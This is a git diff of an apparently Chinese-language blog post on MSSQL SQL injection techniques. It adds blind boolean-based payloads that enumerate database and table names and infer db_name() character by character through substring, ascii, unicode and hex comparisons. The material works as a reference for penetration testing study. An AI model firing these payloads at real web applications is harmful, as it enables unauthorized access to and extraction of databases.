@@ -11,7 +11,7 @@ draft = false
  * @Author: reber
  * @Mail: 1070018473@qq.com
  * @Date: 2018-09-04 10:45:01
- * @LastEditTime: 2019-06-20 22:12:54
+ * @LastEditTime: 2019-12-11 13:15:09
  -->
 ### 0x00 基础信息探测
 ```sql
@@ -94,14 +94,28 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 ![75](/img/post/20180904-113720.png)
 
 ### 0x02 boolean-based blind 注入
+```sql
+-- 得到数据库名:
+select top 1 name from master.dbo.sysdatabases where name not in (select top 2 name from master.dbo.sysdatabases)
+
+-- 得到表名:
+select top 1 name from test.dbo.sysobjects where xtype='U' and name not in (select top 1 name from test.dbo.sysobjects where xtype='U');
 ```
+
+```sql
 ?id=1 and substring(db_name(),1,1)='a' --
 ?id=1 and substring(db_name(),1,1)='b' --
 ```
 
 ```sql
+-- 转换为数字
 ?id=1 and unicode(substring((select db_name()),1,1))>88 --
 ?id=1 and ascii(substring((select db_name()),1,1))>88 --
+```
+
+```sql
+-- 转换为16进制
+id=1 and (select master.dbo.fn_varbintohexstr(CONVERT(varbinary(30),(substring(db_name(),1,1)))) from master..sysdatabases where dbid=1) not in ('0x7400')
 ```
 
 ### 0x03 Stacked 注入
